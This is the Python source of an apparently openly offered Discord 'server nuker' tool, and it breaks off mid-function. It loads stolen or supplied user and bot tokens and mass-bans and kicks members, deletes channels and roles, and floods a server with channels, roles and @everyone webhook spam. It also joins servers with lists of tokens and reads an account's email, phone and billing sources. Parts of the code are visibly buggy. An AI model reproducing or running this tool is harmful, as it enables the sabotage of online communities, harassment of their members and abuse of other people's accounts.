import requests
import json
import pathlib 
import time
import websocket
import base64
import random
import os
import socket
import colorama
import sys
import pypresence
import threading
import hashlib
import base64
import string
import datetime
import keyboard
import ctypes


from concurrent.futures import ThreadPoolExecutor

colorama.init(autoreset=True)
lock = threading.Lock()

class Colour:

    YELLOW = colorama.Fore.YELLOW
    CYAN = colorama.Fore.CYAN
    WHITE = colorama.Fore.WHITE
    RED = colorama.Fore.RED
    GREEN = colorama.Fore.GREEN
    MAGENTA = colorama.Fore.MAGENTA
    LIGHTBLUE = colorama.Fore.LIGHTBLUE_EX

    BRIGHT = colorama.Style.BRIGHT

class URL:
    IconURL = "https://avatars.githubusercontent.com/u/70201574?v=4"
    Github = "https://github.com/reactxsw"
    Repository = "https://github.com/reactxsw/react-nuker/blob/main/main.py"
    RAW_main_py = "https://raw.githubusercontent.com/reactxsw/react-nuker/main/main.py"
    RAW_config_json = "https://raw.githubusercontent.com/reactxsw/react-nuker/main/config.json"

    CdnURL = "https://cdn.discordapp.com/"
    Canary = "https://canary.discordapp.com/"
    DiscordWebsocket = "wss://gateway.discord.gg/?v=9&encoding=json"
    WebhookBase = "https://discord.com/api/webhooks/"
    BaseURL = "https://discord.com/api/v9/"
    WebhookURL = "https://discord.com/api/webhooks/"

class Constant:
    CheckForUpdate = False
    RPC = True
    Space= " "*19
    Blank = "_"*37
    Lang = "Eng" #[Eng / Thai] 
    if pathlib.Path("config.json").exists():
        START = True
        with open('config.json') as setting:
            config = json.load(setting)
        
        SERVER_ID = config.get("SERVER_ID")
        TOKEN = config.get("TOKEN")
        INVITE_CODE = config.get("INVITE_CODE")

        if SERVER_ID == Blank:
            SERVER_ID = False
        
        if TOKEN == Blank:
            TOKEN = False
        
        if INVITE_CODE == Blank:
            INVITE_CODE = False
        
    else:
        START=False
        with open("config.json", "w") as setting:
            setting.writelines(
                [
                    "{",
                        "\n"
                        "    "+f'"SERVER_ID": "{Blank}",',
                        "\n",
                        "    "+f'"TOKEN": "{Blank}",',
                        "\n",
                        "    "+f'"INVITE_CODE": "{Blank}"',
                        "\n",
                    "}"
                ]
            )
    
    VOICE_ID = "873904278346010734"
    CLIENT_ID = "794921074768216126"
    LARGE_IMAGE = "smilewinlogo"
    IP_ADDR = socket.gethostbyname(socket.gethostname())


    if pathlib.Path("tokens.txt").exists():
        with open("tokens.txt") as f:
            TOKENS = [x.strip() for x in f.readlines()] 
    else:
        file = open("tokens.txt", "w") 

class RandomInfo():
    def username():
        return "".join(random.choice(string.ascii_letters +string.digits) for x in range(random.randint(8, 12)))

class Update:

    def CheckUpdate(Check):
        if Check is True:

            with open(__file__, "r", encoding="utf8") as f:
                file = f.read()

            urlcode = requests.get(URL.RAW_main_py).text
            urlhash = hashlib.sha256((urlcode).encode('utf-8')).hexdigest()

            if hashlib.sha256((file).encode('utf-8')).hexdigest() != urlhash:
                print(f"{Constant.Space}There is an update availble. Do you want to Update ? ")
                return "UPDATE" ,input(f"{Constant.Space}[ Y / N ] ")

            else:
                return "UPTODATE", "NULL"
        
        else:
            pass

    def UpdateProgram(self):
        print("ajajaj")


class Infomation:

    def __init__(self):
        self.Author = "REACT#1120"
        self.__VERSION__ = "2.0.0"
        self.Github = URL.Github
        self.Repository = URL.Repository

    def Credit(self):
        print(self.Author)

class Status:

    SuccessStatus = [200,201,204]

    def Fail(Text):
        lock.acquire()
        print(f"{Constant.Space}{Colour.BRIGHT}{Colour.RED}[{Colour.WHITE}FAIL{Colour.RED}] {Text}")
        lock.release()

    def Success(Text):
        lock.acquire()
        print(f"{Constant.Space}{Colour.BRIGHT}{Colour.GREEN}[{Colour.WHITE}SUCCESS{Colour.GREEN}] {Text}")
        lock.release()
    
    def Ratelimit(Text):
        lock.acquire()
        print(f"{Constant.Space}{Colour.BRIGHT}{Colour.MAGENTA}[{Colour.WHITE}RATELIMIT{Colour.MAGENTA}] {Text}")
        lock.release()

class Function:
    def ConvertImgToBase64(Image):
        with open(Image, "rb") as img_file:
            Base64img = base64.b64encode(img_file.read()).decode()

        return (f"data:image/jpeg;base64,{Base64img}")

    def Credit():
        print(Infomation().Author)
        print(Infomation().__VERSION__)
        print(Infomation().Github) 

    def DiscordRPC():
        if Constant.RPC is True:
            RPC = pypresence.Presence(Constant.CLIENT_ID)  
            RPC.connect() 
            RPC.update(state="Hacking",details="Smilewin discord server", join="https discord.gg/3UJFaRvJRC" ,large_image=Constant.LARGE_IMAGE,start=time.time())
        
        else:
            pass
        
    def CheckInternet():
        try:
            host = socket.gethostbyname("1.1.1.1")
            sk = socket.create_connection((host, 80), 2)
            sk.close()
            return True 
        except:
            pass
        return False
    
    def Clear():
        os.system("cls" if os.name == "nt" else "clear")
    
    def Spinner():
        l = ['|', '/', '-', '\\']
        for i in l*3:
            sys.stdout.write('\r'f"{Colour.BRIGHT}{Colour.YELLOW}Loading... {i}")
            sys.stdout.flush()
            time.sleep(0.075)

    def Menu():
        if Constant.Lang.upper() in "ENGLISH":
            i = 1
        
        else:
            i = 2
        
        print(f"""{Colour.LIGHTBLUE}                
                                        ██▀███  ▓█████ ▄▄▄       ▄████▄  ▄▄▄█████▓    {Colour.WHITE}B{Colour.LIGHTBLUE}
                                        ▓██ ▒ ██▒▓█   ▀▒████▄    ▒██▀ ▀█  ▓  ██▒ ▓▒   {Colour.WHITE}Y{Colour.LIGHTBLUE}
                                        ▓██ ░▄█ ▒▒███  ▒██  ▀█▄  ▒▓█    ▄ ▒ ▓██░ ▒░  
                                        ▒██▀▀█▄  ▒▓█  ▄░██▄▄▄▄██ ▒▓▓▄ ▄██▒░ ▓██▓ ░    {Colour.WHITE}R{Colour.LIGHTBLUE}
                                        ░██▓ ▒██▒░▒████▒▓█   ▓██▒▒ ▓███▀ ░  ▒██▒ ░    {Colour.WHITE}E{Colour.LIGHTBLUE}
                                        ░ ▒▓ ░▒▓░░░ ▒░ ░▒▒   ▓▒█░░ ░▒ ▒  ░  ▒ ░░      {Colour.WHITE}A{Colour.LIGHTBLUE}
                                        ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░  ░  ▒       ░         {Colour.WHITE}C{Colour.LIGHTBLUE}
                                        V.{Infomation().__VERSION__}                                       {Colour.WHITE}T{Colour.LIGHTBLUE}""")
        print(f"{Colour.YELLOW}{Constant.Space}╔═════════════════════╦═════════════════════╦═════════════════════╦═════════════════════╗")
        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}1{Colour.CYAN}] {Main.FunctionDict[1][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[1][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}10{Colour.CYAN}]{Main.FunctionDict[10][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[10][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}19{Colour.CYAN}]{Main.FunctionDict[19][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[19][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}28{Colour.CYAN}]{Main.FunctionDict[28][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[28][i])))}║")
        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}2{Colour.CYAN}] {Main.FunctionDict[2][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[2][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}11{Colour.CYAN}]{Main.FunctionDict[11][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[11][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}20{Colour.CYAN}]{Main.FunctionDict[20][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[20][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}29{Colour.CYAN}]{Main.FunctionDict[29][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[29][i])))}║")
        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}3{Colour.CYAN}] {Main.FunctionDict[3][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[3][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}12{Colour.CYAN}]{Main.FunctionDict[12][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[12][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}21{Colour.CYAN}]{Main.FunctionDict[21][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[21][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}30{Colour.CYAN}]{Main.FunctionDict[30][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[30][i])))}║")
        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}4{Colour.CYAN}] {Main.FunctionDict[4][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[4][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}13{Colour.CYAN}]{Main.FunctionDict[13][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[13][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}22{Colour.CYAN}]{Main.FunctionDict[22][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[22][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}31{Colour.CYAN}]{Main.FunctionDict[31][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[31][i])))}║")
        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}5{Colour.CYAN}] {Main.FunctionDict[5][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[5][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}14{Colour.CYAN}]{Main.FunctionDict[14][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[14][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}23{Colour.CYAN}]{Main.FunctionDict[23][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[23][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}32{Colour.CYAN}]{Main.FunctionDict[32][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[32][i])))}║")
        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}6{Colour.CYAN}] {Main.FunctionDict[6][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[6][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}15{Colour.CYAN}]{Main.FunctionDict[15][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[15][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}24{Colour.CYAN}]{Main.FunctionDict[24][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[24][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}33{Colour.CYAN}]{Main.FunctionDict[33][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[33][i])))}║")
        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}7{Colour.CYAN}] {Main.FunctionDict[7][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[7][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}16{Colour.CYAN}]{Main.FunctionDict[16][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[16][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}25{Colour.CYAN}]{Main.FunctionDict[25][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[25][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}34{Colour.CYAN}]{Main.FunctionDict[34][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[34][i])))}║")
        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}8{Colour.CYAN}] {Main.FunctionDict[8][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[8][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}17{Colour.CYAN}]{Main.FunctionDict[17][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[17][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}26{Colour.CYAN}]{Main.FunctionDict[26][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[26][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}35{Colour.CYAN}]{Main.FunctionDict[35][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[35][i])))}║")
        print(f"{Colour.YELLOW}{Constant.Space}║{Colour.CYAN} [{Colour.WHITE}9{Colour.CYAN}] {Main.FunctionDict[9][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[9][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}18{Colour.CYAN}]{Main.FunctionDict[18][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[18][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}27{Colour.CYAN}]{Main.FunctionDict[27][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[27][i])))}"\
                                             f"║{Colour.CYAN} [{Colour.WHITE}36{Colour.CYAN}]{Colour.RED}{Main.FunctionDict[36][i]}{Colour.YELLOW}{' '*(16-(len(Main.FunctionDict[36][i])))}║")
        print(f"{Colour.YELLOW}{Constant.Space}╚═════════════════════╩═════════════════════╩═════════════════════╩═════════════════════╝")

class ReqHeader:

    def UserAgent():
        
        return random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.6; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (X11; Linux i686; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.6; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (X11; Linux i686; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.47",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.31"
            ])

    def DiscordHeader():
        UA = ReqHeader.UserAgent()
        if requests.get(f"{URL.BaseURL}users/@me", headers={"Authorization": Constant.TOKEN}).status_code == 200:
            return {
                "authorization": f"{Constant.TOKEN}",
                "user-agent": f"{UA}",
                }
        else:
            return {
                "Authorization": f"Bot {Constant.TOKEN}"
                }

class Data:
    def GetTokenInfo():
        if Constant.TOKEN is not False:
            CC_Digits = {
                'american express': '3',
                'visa': '4',
                'mastercard': '5'
            }
            response  = requests.get(f"{URL.BaseURL}users/@me",headers= ReqHeader.DiscordHeader())
            print(response.json())
            if response.status_code in Status.SuccessStatus:
                Userid = response.json()["id"]
                Username = f'{response.json()["username"]}#{response.json()["discriminator"]}'
                Email = response.json()["email"]
                Phone = response.json()["phone"]
                Language = response.json()["locale"]
                AvatarURL = f'{URL.CdnURL}avatars/{Userid}/{response.json()["avatar"]}.webp'
                subscription = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=ReqHeader.DiscordHeader()).json()
                nitro = bool(len(subscription) > 0)
                if nitro:
                    NitroEnd = datetime.strptime(subscription[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    NitroStart = datetime.strptime(subscription[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                    NitroLeft = abs((NitroStart - NitroEnd).days)
                Billing = requests.get('https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=ReqHeader.DiscordHeader()).json()
                print(Billing)
                print(f"{Constant.Space}")
        
        else:
            print("")

    def GetChannel_ID():
        if Constant.TOKEN is not False:
            channel_id = [] 
            channels = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/channels", headers= ReqHeader.DiscordHeader()).json()
            for i , items in enumerate(channels):
                channel_id.append(items["id"])

            return channel_id
        
        else:
            print("no token ~")
    
    def GetRole_ID():
        if Constant.TOKEN is not False:
            role_id = []
            roles = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/roles", headers= ReqHeader.DiscordHeader()).json()
            for i , items in enumerate(roles):
                role_id.append(items["id"])

            return role_id

        else:
            pass

    def GetMember_ID():
        if Constant.TOKEN is not False:
            member_id = []
            members = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/members?limit=1000", headers= ReqHeader.DiscordHeader()).json()
            for i , items in enumerate(members):
                member_id.append(items["user"]["id"])

            return member_id
        
        else:
            pass
    

class Discord:
    def CopyServer():
        if Constant.TOKEN is not False:
            template = requests.get(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/templates", headers=ReqHeader.DiscordHeader()).json()
            if len(template) > 0:
                requests.delete(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/templates/{template[0]['code']}",headers=ReqHeader.DiscordHeader())

            response = requests.post(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/templates", headers=ReqHeader.DiscordHeader(),json={
                "description":"",
                "name":"React"
            }).json() 
            guild = requests.get(f"{URL.BaseURL}/guilds/{Constant.SERVER_ID}", headers=ReqHeader.DiscordHeader()).json()
            guild_icon = base64.b64encode(requests.get(f'{URL.CdnURL}icons/{guild["id"]}/{guild["icon"]}.webp?size=1024').content).decode()    
            bs64_guild_icon = (f"data:image/jpeg;base64,{guild_icon}")
            create = requests.post(f"{URL.BaseURL}guilds/templates/{response['code']}",headers=ReqHeader.DiscordHeader(),json={
                "icon":bs64_guild_icon,
                "name":guild["name"]
            })
            if create.status_code in Status.SuccessStatus:
                Status.Success("Server Copied")

        else:
            print(f"{Constant.Space}no token ~")

    def CreateServer(ServerName):
        response= requests.post('https://discord.com/api/v9/guilds', headers=ReqHeader.DiscordHeader(), json={
            "name": f"{ServerName}"
            })
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"Created Server named {ServerName}")
        
        elif response.status_code == 429:
            Status.Ratelimit(f"You are being rate limited")
            time.sleep(0.05)
            threading.Thread(target=Discord.CreateServer, args=(ServerName)).start()

        else:
            Status.Fail("Unable to Create new Server")

    def ChangeServerImage():
        Image = [] 
        Extension = [".jpg",".png"]
        for i in os.listdir(pathlib.Path().absolute()):
            if (os.path.splitext(i)[1]).lower() in Extension:
                Image.append(i)

        if len(Image) != 0:
            for i , items in Image:
                print(f"{Constant.Space}{Colour.WHITE}[{Colour.CYAN}{i+1}{Colour.WHITE}]. {items}")
            
            base64img = Function.ConvertImgToBase64(Image[int(input(f"{Constant.Space}"))-1])
            response = requests.patch(f"https://discord.com/api/v9/guilds/{Constant.SERVER_ID}",
                json= {
                    "icon":base64img
                    },
                    headers=ReqHeader.DiscordHeader())
            print(response.text)
            if response.status_code in Status.SuccessStatus:
                Status.Success(f"Changed")
                
        else:
            print(f"{Constant.Space}No picture")

    def ChangeStatus():

        Text = input(f"{Constant.Space}{Colour.YELLOW}Status : {Colour.WHITE}")
        Dynamic = input(f"{Constant.Space}{Colour.YELLOW}Moving Status [Y/N] : {Colour.WHITE}")
        if Dynamic.upper() in ["Y","YES"]:
            Stat = [""]
            for i in range(len(Text)):
                Stat.append(Stat[i]+Text[i])

            del Stat[0]

            while True:
                for i , item in enumerate(Stat):
                    response = requests.patch(f"{URL.BaseURL}users/@me/settings",headers=ReqHeader.DiscordHeader(), json={
                        "custom_status": {
                            "text": item}
                            })
                    if response.status_code in Status.SuccessStatus:
                        Status.Success(f"Status changed to {item}")

                    elif response.status_code == 429:
                        Status.Ratelimit("Ratelimit")
                    
                    else:
                        Status.Fail(f"Unable to change status to {item}")
        else:
            response = requests.patch(f"{URL.BaseURL}users/@me/settings",headers=ReqHeader.DiscordHeader(), json={
                        "custom_status": {
                            "text": Text}
                            })
            
            if response.status_code in Status.SuccessStatus:
                        Status.Success(f"Status changed to {Text}")

            elif response.status_code == 429:
                Status.Ratelimit("Ratelimit")
            
            else:
                Status.Fail(f"Unable to change status to {Text}")

    def SendWebhook(Webhook_URL, Message):
        try:
            response =  requests.post(Webhook_URL, headers={
                "content-type": "application/json"
                },
                json={
                    "username":"React",
                    "avatar_url": URL.IconURL,
                    "content": "@everyone",
                    "tts": "true",
                    "embeds": [{
                        "title": "React Server Nuker",
                        "description": f"@everyone\n\n> {Message}",
                        "color": random.randint(0, 16777215),
                        "author": {
                                "name": "React Server Nuker",
                                "url": "https://smilewindiscord-th.web.app/joindiscord.html",
                                "icon_url": URL.IconURL
                            },
                            "footer": {
                                "text": "Nuked ~",
                                "icon_url": URL.IconURL
                            },
                            "timestamp": f"{str(datetime.datetime.utcnow())}",
                            "image": {
                                "url": URL.IconURL
                            },
                            "thumbnail": {
                                "url": URL.IconURL
                            }
                        }
                    ]
                }
            )
            if response.status_code in Status.SuccessStatus:
                Status.Success(f"Webhook sent")
            
            elif response.status_code == 429:
                Status.Ratelimit(f"Ratelimited")

            else:
                Status.Fail(f"Unable to send")

        except Exception as e:
            print(e)
    
    def CreateRole(RoleName):
        response = requests.post(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/roles", headers=ReqHeader.DiscordHeader(), json={
            "name":RoleName
        })
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"Created Role {RoleName}")

        elif response.status_code == 429:
            Status.Ratelimit(f"")
            time.sleep(0.05)
            threading.Thread(target=Discord.CreateChannel, args=(RoleName)).start()
        
        else:
            Status.Fail(f"Couldn't Create Channel {RoleName}")

    def DeleteRole(RoleID):
        response = requests.delete(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/roles/{RoleID}", headers=ReqHeader.DiscordHeader())
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"Created role {RoleID}")
        
        elif response.status_code == 429:
            Status.Ratelimit(f"")
            time.sleep(0.05)
            threading.Thread(target=Discord.CreateRole, args=(RoleID)).start()

        else:
            Status.Fail(f"Couldn't delete role {RoleID}")

    def ChangeRoleName(RoleID , RoleName):
        response = requests.patch(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/roles/{RoleID}", headers=ReqHeader.DiscordHeader(), json={
            "name": f"{RoleName}"
        })

        if response.status_code in Status.SuccessStatus:
            Status.Success(f"CHANNEL NAME CHANGED")
        
        elif response.status_code == 429:
            time.sleep(0.05)
            threading.Thread(target=Discord.ChangeChannelName,args=(RoleID,RoleName)).start()

        else:
            Status.Fail(f"CHANNEL NAME NOT CHANGED")

    def CreateChannel(ChannelName):
        response = requests.post(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/channels", headers=ReqHeader.DiscordHeader(), json = {
            'name': ChannelName,
            'type': 0
        })
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"Created Channel {ChannelName}")
        
        elif response.status_code == 429:
            Status.Ratelimit(f"Ratelimit")
            time.sleep(0.05)
            threading.Thread(target=Discord.CreateChannel, args=(ChannelName)).start()

        else:
            print(response.json())
            Status.Fail(f"Couldn't Create Channel {ChannelName}")


    def DeleteChannel(ChannelID):
        try:
            response = requests.delete(f"{URL.BaseURL}channels/{ChannelID}", headers=ReqHeader.DiscordHeader())
            if response.status_code in Status.SuccessStatus:
                Status.Success(f"Deleted Channel {ChannelID}")
            
            elif response.status_code == 429:
                Status.Ratelimit("Ratelimit")

            else:
                print(response.json())
                Status.Fail(f"Couldn't Delete Channel {ChannelID}")
        except:
            pass
    
    def ChangeChannelName(Channel , ChannelName):
        response = requests.patch(f"{URL.BaseURL}channels/{Channel}", headers=ReqHeader.DiscordHeader(), json={
            "name": f"{ChannelName}"
        })

        if response.status_code in Status.SuccessStatus:
            Status.Success(f"CHANNEL NAME CHANGED")
        
        elif response.status_code == 429:
            time.sleep(0.05)
            threading.Thread(target=Discord.ChangeChannelName,args=(Channel, ChannelName)).start()

        else:
            print(response.json())
            Status.Fail(f"CHANNEL NAME NOT CHANGED")

    def CreateCategory(ChannelName):
        response = requests.post(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/channels", headers=ReqHeader.DiscordHeader(), json = {
            "name": ChannelName,
            "type": 4,
            "permission_overwrites": []

        })
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"Created Channel {ChannelName}")
        
        elif response.status_code == 429:
            Status.Ratelimit(f"")
            time.sleep(0.05)
            threading.Thread(target=Discord.CreateChannel, args=(ChannelName)).start()

        else:
            Status.Fail(f"Couldn't Create Channel {ChannelName}")
    
    def CreateVoiceChannel(ChannelName):
        response = requests.post(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/channels", headers=ReqHeader.DiscordHeader(), json = {
            "name": ChannelName,
            "type": 2,
            "permission_overwrites": []

        })
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"Created Channel {ChannelName}")
        
        elif response.status_code == 429:
            Status.Ratelimit(f"")
            time.sleep(0.05)
            threading.Thread(target=Discord.CreateChannel, args=(ChannelName)).start()

        else:
            Status.Fail(f"Couldn't Create Channel {ChannelName}")

    def Ban(Member):
        try:
            response = requests.put(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/bans/{Member}", headers=ReqHeader.DiscordHeader(), json = {
                'delete_message_days': '7',
                'reason': 'NUKE'
            })
            if response.status_code in Status.SuccessStatus:
                Status.Success(f"Banned {Member}")

            elif response.status_code == 429:
                time.sleep(0.05)
                threading.Thread(target=Discord.Ban, args=(Member)).start()
                
            else:
                Status.Fail(f"Failed to ban {Member}")

        except:
            pass

    def Kick(Member):
        try:
            response = requests.delete(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/members/{Member}", headers=ReqHeader.DiscordHeader(), json = {
                'delete_message_days': '7',
                'reason': 'NUKE'
            })
            if response.status_code in Status.SuccessStatus:
                Status.Success(f"{Member}")

            elif response.status_code == 429:
                time.sleep(0.05)
                threading.Thread(target=Discord.Kick, args=(Member)).start()
            
            else:
                Status.Fail(f"{Member}")
                
        except:
            pass

    def CreateWebhook(Channel):
        response = requests.post(f"{URL.BaseURL}channels/{Channel}/webhooks", json={
            "name": "REACT"
            }, headers= ReqHeader.DiscordHeader())

        if response.status_code in Status.SuccessStatus:
            Status.Success(f"WEBHOOK CREATED")

        elif response.status_code == 429:
            threading.Thread(target=Discord.CreateWebhook,args=(Channel)).start()
        
        else:
            Status.Fail(f"WEBHOOK NOT CREATED")

    def Join(token):
        response = requests.post(f"{URL.BaseURL}invites/{Constant.INVITE_CODE}", headers= ReqHeader.DiscordHeader())
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"TOKEN : {token} JOINED")
        
        elif response.status_code == 429:
            threading.Thread(target=Discord.Join,args=(token)).start()

        else:
            Status.Fail(f"TOKEN : {token} NOT JOINED")

    def Leave(token):   
        response = requests.delete(f"{URL.BaseURL}users/@me/guilds/{Constant.SERVER_ID}", json={"lurking": "false"} , headers=ReqHeader())
        if response.status_code in Status.SuccessStatus:
            Status.Success(f"TOKEN : {token} LEAVE")
        
        elif response.status_code == 429:
            threading.Thread(target=Discord.Leave,args=(token)).start()
        
        else:
            Status.Fail(f"TOKEN : {token} NOT LEAVE")

    def Connect(token,VOICE_ID):
        ws = websocket.WebSocket()
        ws.connect(URL.DiscordWebsocket)
        RECV = json.loads(ws.recv())
        heartbeat_interval = RECV['d']['heartbeat_interval']
        ws.send(json.dumps({
                    "op":2,
                    "d": {
                        "token":token, 
                        "properties": {
                            "$os":"windows",
                            "$browser":"Discord",
                            "$device": "desktop" 
                            }
                        }
                    }
                )
            )
        ws.send(json.dumps({
                    "op":4,
                    "d": {
                        "guild_id":Constant.SERVER_ID, 
